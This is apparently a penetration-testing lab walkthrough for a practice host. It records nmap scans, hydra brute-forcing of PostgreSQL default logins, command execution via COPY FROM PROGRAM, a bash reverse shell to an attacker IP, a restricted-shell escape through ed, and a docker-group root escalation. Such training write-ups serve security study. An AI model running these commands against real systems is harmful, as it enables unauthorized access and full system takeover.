### Enumeration
```
IP=192.168.163.60
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,113,8080 -A $IP
```
### Ports
- Banner Grab: nc -nv $IP PORT
- 22
	- OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
	- nc -nv $IP 22
		- SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7
- 113
	- FreeBSD identd
	- `_auth-owners: nobody`
	- nc -nv $IP 113
		- auth
- 5432
	- PostgreSQL DB 12.3 - 12.4
	- nc -nv $IP 5432
		- postgresql
- 8080
	- WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))
	- nc -nv $IP 8080
		- http-alt
- 10000
	- snet-sensor-mgmt
	- nc -nv $IP 10000
		- webmin
### Foothold
- 5432
	- hydra -C /usr/share/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt postgres://$IP
		- postgres:postgres
	- psql -h $IP -p 5432 -U postgres -W
		- postgres  allows login
		- `\list
			- postgres
			- template0
			- template1
		- `\du`
			- superuser
		- RCE
			- CREATE TABLE cmd_exec(cmd_output text);
			- COPY cmd_exec FROM PROGRAM 'id';
			- SELECT * FROM cmd_exec;
			- DROP TABLE IF EXISTS cmd_exec;
			- Oneliner:  CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec; DROP TABLE IF EXISTS cmd_exec;
			- nc -lvnp 22
			- RCE: CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.45.195/22 0>&1"';
				- ![[Pasted image 20240718085300.png]]
- 113
	- ![[Pasted image 20240718080848.png]]
	- ident-user-enum $IP 22 113 5432 8080 10000
	- ssh eleanor@$IP
		- eleanor  -  successful
- 8080
	- Default landing page
		- ![[Pasted image 20240718073603.png]]
	- Versions
		- redmine 4.1.1.stable
			- tried exploit-db 41695
		- scm 1.10.4
	- Login
		- admin:admin
			- requires password change
			- admin123
			- allowed login
	- Directory Brute force
		- dirsearch -u http://$IP
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
	- Vulnerability scan
		- nikto -h http://$IP
### PE
#### Linux
- postgres
	- id
		- uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
	- Have to use eleanor to PE
- eleanor
	- Spawn in with limited shell
		- help
			- GNU bash, version 4.4.12(1)-release (x86_64-pc-linux-gnu)
		- echo $PATH
		- ls /home/eleanor/bin
			- chmod  chown  ed  ls  mv  ping  sleep  touch
		- Check GTFObins for shell
			- ed
				- `ed
				- `!/bin/sh`
			- Then we can edit the path
				- `PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin`
				- Now we can run all the commands
	- id
		- uid=1000(eleanor) gid=1000(eleanor) groups=1000(eleanor),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker)
		- video
			- w
				- check what other users are logged in
				- Only eleanor
		- docker
			- docker image ls
				- ![[Pasted image 20240718082639.png]]
			- docker run -it --rm -v /:/mnt IMAGE_NAME chroot /mnt bash
	- sudo -l
		- no sudo commands
	- uname -a
		- Linux peppo 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux
	- getcap -r / 2>/dev/null
		- nothing
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
			- ![[Pasted image 20240718082113.png]]
	- Users with console
		- eleanor
	- netstat -ano
		- Active ports
			- nothing new
	- linpeas
		- Possible Exploits
		- Interesting Files
### Credentials
### Lessons Learned